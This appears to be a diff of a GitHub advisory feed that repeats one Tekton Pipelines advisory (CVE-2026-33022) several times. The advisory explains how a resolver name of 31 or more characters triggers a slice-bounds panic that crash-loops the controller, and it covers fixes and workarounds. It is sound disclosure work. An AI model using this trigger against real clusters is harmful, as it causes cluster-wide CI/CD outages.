-<p>The controller panics in <code>GenerateDeterministicNameFromSpec</code> when building a deterministic <code>ResolutionRequest</code> name. The generated name has the format <code>{resolver}-{hash}</code> and, when the resolver name is long enough, the result exceeds the DNS-1123 label limit of 63 characters.</p>
-<p>The truncation logic attempts to find a word boundary using <code>strings.LastIndex(name, " ")</code>. Since the generated name never contains spaces (it is composed of the resolver name, a dash, and a hex-encoded hash), <code>LastIndex</code> returns <code>-1</code>, which is then used as a slice bound:</p>
-<pre><code class="language-go">return name[:strings.LastIndex(name[:maxLength], " ")], nil
-// strings.LastIndex returns -1 → panic: slice bounds out of range [:-1]
-</code></pre>
-<p>The panic crashes the controller. Because the offending TaskRun or PipelineRun is re-reconciled on restart, the controller enters a <code>CrashLoopBackOff</code>, blocking all TaskRun and PipelineRun reconciliation cluster-wide until the offending resource is manually deleted.</p>
-<p>Built-in resolvers use short names (<code>git</code>, <code>cluster</code>, <code>bundles</code>, <code>hub</code>) and are not affected under normal usage. The vulnerability is exploitable by any user who can create TaskRuns or PipelineRuns with a custom resolver name.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Denial of service</strong> — A single malicious TaskRun or PipelineRun with a long resolver name is sufficient to crash the Tekton Pipelines controller into a restart loop, blocking all CI/CD reconciliation cluster-wide until the resource is removed.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in versions 1.0.1, 1.3.3, 1.6.1, 1.9.2, 1.10.2.</p>
-<p>The fix computes the hash first, then truncates only the prefix (resolver name) to fit within the DNS-1123 label limit, preserving the full hash to maintain determinism and uniqueness of <code>ResolutionRequest</code> names.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict who can create TaskRun and PipelineRun resources via Kubernetes RBAC. There is no validation-side workaround without patching.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>All releases from <strong>v0.60.0</strong> through <strong>v1.10.0</strong>.</p>
-<p>The vulnerable truncation logic was introduced in commit <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor"), first released in v0.60.0 (2024-05-22).</p>
-<p>Currently supported affected releases:</p>
-<ul>
-<li><strong>v1.10.x</strong> (latest)</li>
-<li><strong>v1.9.x</strong> (LTS, EOL 2027-01-30)</li>
-<li><strong>v1.6.x</strong> (LTS, EOL 2026-10-31)</li>
-<li><strong>v1.3.x</strong> (LTS, EOL 2026-08-04)</li>
-<li><strong>v1.0.x</strong> (LTS, EOL 2026-04-29)</li>
-</ul>
-<p>Releases prior to v0.60.0 are <strong>not affected</strong> — the truncation code did not exist.</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>This vulnerability was reported by Oleh Konko (@1seal), who provided a thorough vulnerability analysis, proof-of-concept, and review of the fix. Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix (main): <a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">5eead3f859b9</a></li>
-<li>Fix (v1.10.x): <a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">01673237c464</a></li>
-<li>Fix (v1.9.x): <a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">edc64bbf2232</a></li>
-<li>Fix (v1.6.x): <a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">0fa2d66cff81</a></li>
-<li>Fix (v1.3.x): <a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">5e4905fb6754</a></li>
-<li>Fix (v1.0.x): <a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">ebc197e2b973</a></li>
-<li>Introduced in: <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor")</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33022">https://nvd.nist.gov/vuln/detail/CVE-2026-33022</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-17T19:46:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
-        <id>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</id>
-        <link href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj"/>
-        <updated>2026-03-25T18:26:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A user with permission to create or update a TaskRun or PipelineRun can crash the Tekton Pipelines controller by setting <code>.spec.taskRef.resolver</code> (or <code>.spec.pipelineRef.resolver</code>) to a string of 31 characters or more, causing a denial of service for all reconciliation.</p>
-<h3 id="details">Details</h3>
-<p>The controller panics in <code>GenerateDeterministicNameFromSpec</code> when building a deterministic <code>ResolutionRequest</code> name. The generated name has the format <code>{resolver}-{hash}</code> and, when the resolver name is long enough, the result exceeds the DNS-1123 label limit of 63 characters.</p>
-<p>The truncation logic attempts to find a word boundary using <code>strings.LastIndex(name, " ")</code>. Since the generated name never contains spaces (it is composed of the resolver name, a dash, and a hex-encoded hash), <code>LastIndex</code> returns <code>-1</code>, which is then used as a slice bound:</p>
-<pre><code class="language-go">return name[:strings.LastIndex(name[:maxLength], " ")], nil
-// strings.LastIndex returns -1 → panic: slice bounds out of range [:-1]
-</code></pre>
-<p>The panic crashes the controller. Because the offending TaskRun or PipelineRun is re-reconciled on restart, the controller enters a <code>CrashLoopBackOff</code>, blocking all TaskRun and PipelineRun reconciliation cluster-wide until the offending resource is manually deleted.</p>
-<p>Built-in resolvers use short names (<code>git</code>, <code>cluster</code>, <code>bundles</code>, <code>hub</code>) and are not affected under normal usage. The vulnerability is exploitable by any user who can create TaskRuns or PipelineRuns with a custom resolver name.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Denial of service</strong> — A single malicious TaskRun or PipelineRun with a long resolver name is sufficient to crash the Tekton Pipelines controller into a restart loop, blocking all CI/CD reconciliation cluster-wide until the resource is removed.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in versions 1.0.1, 1.3.3, 1.6.1, 1.9.2, 1.10.2.</p>
-<p>The fix computes the hash first, then truncates only the prefix (resolver name) to fit within the DNS-1123 label limit, preserving the full hash to maintain determinism and uniqueness of <code>ResolutionRequest</code> names.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict who can create TaskRun and PipelineRun resources via Kubernetes RBAC. There is no validation-side workaround without patching.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>All releases from <strong>v0.60.0</strong> through <strong>v1.10.0</strong>.</p>
-<p>The vulnerable truncation logic was introduced in commit <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor"), first released in v0.60.0 (2024-05-22).</p>
-<p>Currently supported affected releases:</p>
-<ul>
-<li><strong>v1.10.x</strong> (latest)</li>
-<li><strong>v1.9.x</strong> (LTS, EOL 2027-01-30)</li>
-<li><strong>v1.6.x</strong> (LTS, EOL 2026-10-31)</li>
-<li><strong>v1.3.x</strong> (LTS, EOL 2026-08-04)</li>
-<li><strong>v1.0.x</strong> (LTS, EOL 2026-04-29)</li>
-</ul>
-<p>Releases prior to v0.60.0 are <strong>not affected</strong> — the truncation code did not exist.</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>This vulnerability was reported by Oleh Konko (@1seal), who provided a thorough vulnerability analysis, proof-of-concept, and review of the fix. Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix (main): <a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">5eead3f859b9</a></li>
-<li>Fix (v1.10.x): <a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">01673237c464</a></li>
-<li>Fix (v1.9.x): <a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">edc64bbf2232</a></li>
-<li>Fix (v1.6.x): <a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">0fa2d66cff81</a></li>
-<li>Fix (v1.3.x): <a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">5e4905fb6754</a></li>
-<li>Fix (v1.0.x): <a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">ebc197e2b973</a></li>
-<li>Introduced in: <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor")</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33022">https://nvd.nist.gov/vuln/detail/CVE-2026-33022</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-17T19:46:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
-        <id>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</id>
-        <link href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj"/>
-        <updated>2026-03-25T18:26:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A user with permission to create or update a TaskRun or PipelineRun can crash the Tekton Pipelines controller by setting <code>.spec.taskRef.resolver</code> (or <code>.spec.pipelineRef.resolver</code>) to a string of 31 characters or more, causing a denial of service for all reconciliation.</p>
-<h3 id="details">Details</h3>
-<p>The controller panics in <code>GenerateDeterministicNameFromSpec</code> when building a deterministic <code>ResolutionRequest</code> name. The generated name has the format <code>{resolver}-{hash}</code> and, when the resolver name is long enough, the result exceeds the DNS-1123 label limit of 63 characters.</p>
-<p>The truncation logic attempts to find a word boundary using <code>strings.LastIndex(name, " ")</code>. Since the generated name never contains spaces (it is composed of the resolver name, a dash, and a hex-encoded hash), <code>LastIndex</code> returns <code>-1</code>, which is then used as a slice bound:</p>
-<pre><code class="language-go">return name[:strings.LastIndex(name[:maxLength], " ")], nil
-// strings.LastIndex returns -1 → panic: slice bounds out of range [:-1]
-</code></pre>
-<p>The panic crashes the controller. Because the offending TaskRun or PipelineRun is re-reconciled on restart, the controller enters a <code>CrashLoopBackOff</code>, blocking all TaskRun and PipelineRun reconciliation cluster-wide until the offending resource is manually deleted.</p>
-<p>Built-in resolvers use short names (<code>git</code>, <code>cluster</code>, <code>bundles</code>, <code>hub</code>) and are not affected under normal usage. The vulnerability is exploitable by any user who can create TaskRuns or PipelineRuns with a custom resolver name.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Denial of service</strong> — A single malicious TaskRun or PipelineRun with a long resolver name is sufficient to crash the Tekton Pipelines controller into a restart loop, blocking all CI/CD reconciliation cluster-wide until the resource is removed.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in versions 1.0.1, 1.3.3, 1.6.1, 1.9.2, 1.10.2.</p>
-<p>The fix computes the hash first, then truncates only the prefix (resolver name) to fit within the DNS-1123 label limit, preserving the full hash to maintain determinism and uniqueness of <code>ResolutionRequest</code> names.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict who can create TaskRun and PipelineRun resources via Kubernetes RBAC. There is no validation-side workaround without patching.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>All releases from <strong>v0.60.0</strong> through <strong>v1.10.0</strong>.</p>
-<p>The vulnerable truncation logic was introduced in commit <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor"), first released in v0.60.0 (2024-05-22).</p>
-<p>Currently supported affected releases:</p>
-<ul>
-<li><strong>v1.10.x</strong> (latest)</li>
-<li><strong>v1.9.x</strong> (LTS, EOL 2027-01-30)</li>
-<li><strong>v1.6.x</strong> (LTS, EOL 2026-10-31)</li>
-<li><strong>v1.3.x</strong> (LTS, EOL 2026-08-04)</li>
-<li><strong>v1.0.x</strong> (LTS, EOL 2026-04-29)</li>
-</ul>
-<p>Releases prior to v0.60.0 are <strong>not affected</strong> — the truncation code did not exist.</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>This vulnerability was reported by Oleh Konko (@1seal), who provided a thorough vulnerability analysis, proof-of-concept, and review of the fix. Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix (main): <a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">5eead3f859b9</a></li>
-<li>Fix (v1.10.x): <a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">01673237c464</a></li>
-<li>Fix (v1.9.x): <a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">edc64bbf2232</a></li>
-<li>Fix (v1.6.x): <a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">0fa2d66cff81</a></li>
-<li>Fix (v1.3.x): <a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">5e4905fb6754</a></li>
-<li>Fix (v1.0.x): <a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">ebc197e2b973</a></li>
-<li>Introduced in: <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor")</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33022">https://nvd.nist.gov/vuln/detail/CVE-2026-33022</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-17T19:46:29.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
